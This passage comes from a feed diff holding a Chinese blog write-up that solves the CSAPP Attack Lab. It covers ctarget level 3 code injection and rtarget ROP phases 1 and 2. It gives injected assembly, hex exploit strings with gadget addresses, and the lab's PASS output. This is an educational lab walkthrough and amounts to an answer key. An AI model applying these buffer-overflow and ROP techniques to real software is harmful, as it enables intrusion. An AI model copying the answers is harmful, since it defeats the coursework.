+<img src="http://static.yulan.net.cn/image/_d13d42c5c8d72192ca39358968839d97.png" alt="" loading="lazy"><br>
+要注意函数hexmatch会使用栈上的空间，可能会覆盖我们的cookie<br>
+<strong>不过没关系，</strong><code>**sub 0x28 %rsp**</code>**  ，咱给自己造个栈**<br>
+所以我们嵌入的代码应该是</p>
+<pre><code>movq $0x5561dc93,%rdi
+sub $0x28,%rsp
+pushq $0x4018fa
+retq
+</code></pre>
+<p>其中第一步传给%rdi的地址应该是你存放cookie的地址，一定要数清楚，我们还要把cookie使用ascii码转义，并在末尾添加 <code>0x00</code> 表示结束。</p>
+<h4 id="生成机器码">生成机器码</h4>
+<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ objdump -d asscode.o
+
+asscode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 &lt;.text&gt;:
+   0:   48 c7 c7 93 dc 61 55    mov    $0x5561dc93,%rdi
+   7:   48 83 ec 28             sub    $0x28,%rsp
+   b:   68 fa 18 40 00          pushq  $0x4018fa
+  10:   c3                      retq
+</code></pre>
+<h3 id="最终写出入侵字串">最终写出入侵字串</h3>
+<pre><code>48 c7 c7 93 dc 61 55 48 83 ec 28 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00  78 dc 61 55
+</code></pre>
+<h3 id="通过">通过！！！</h3>
+<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit3-raw.txt 
+Cookie: 0x59b997fa
+Touch3!: You called touch3(&quot;59b997fa&quot;)
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 93 DC 61 55 48 83 EC 28 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 78 DC 61 55
+</code></pre>
+<h2 id="rtarget">rtarget</h2>
+<h3 id="1">1</h3>
+<p>rtarget要求我们进行ROP攻击，因为栈随机化，所以我们不能像之前一样指定地址，只能依靠代码中原有的gadget进行入侵。<br>
+我的想法是先把cookie pop到某个寄存器中，然后再mov到rdi里面。<br>
+参考了实验手册，检索了fram部分的代码后发现只有 <code>58</code> 可以使用，也就是 <code>popq %rax</code> <br>
+<img src="http://static.yulan.net.cn/image/_74f7a02a83c7342936036627bf6b81df.png" alt="" loading="lazy"><br>
+然后寻找到一段 <code>movq %rax,%rdi</code> 的指令。<br>
+<img src="http://static.yulan.net.cn/image/_519414af020393b2e70643e9fd7c701e.png" alt="" loading="lazy"><br>
+这两个就是我们使用的gagget，地址分别是 <code>0x4019ab</code> 和· <code>0x4019a2</code>。<br>
+将他们连续执行就会是如下情形：</p>
+<pre><code>popq %rax
+nop
+ret
+movq %rax,%rdi
+ret
+</code></pre>
+<p>我们只用准备好pop出的数据和返回位置即可。<br>
+这里要注意栈是向高字节收缩，所以我们需要把我们的插入片段放在40字节缓冲区后面。<br>
+应该插入的代码如下</p>
+<pre><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ec 17 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00
+</code></pre>
+<p>前40个字节没有实际意义，后面指定返回地址与准备pop出的数据</p>
+<h3 id="2">2</h3>
+<p>有些复杂，直接贴出来了</p>
+<pre><code>35 39 62 39 39 37 66 61
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00            06 1a 40 00 00 00 00 00            /* mov %rsp,%rax */
+a2 19 40 00 00 00 00 00            /* mov %rax,%rdi */
+
+ab 19 40 00 00 00 00 00            /* pop %rax */
+48 00 00 00 00 00 00 00
+
+dd 19 40 00 00 00 00 00            /* mov %eax,%edx */
+70 1a 40 00 00 00 00 00            /* mov %edx,%ecx */
+13 1a 40 00 00 00 00 00            /* mov %ecx,%esi */
+d6 19 40 00 00 00 00 00            /* lea (%rdi,%rsi,1),%rax */
+a2 19 40 00 00 00 00 00            /* mov %rax,%rdi */
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61            /* cookie string */
+00 00 00 00 00 00 00 00
+</code></pre>
+]]></content>
+    </entry>
 </feed>
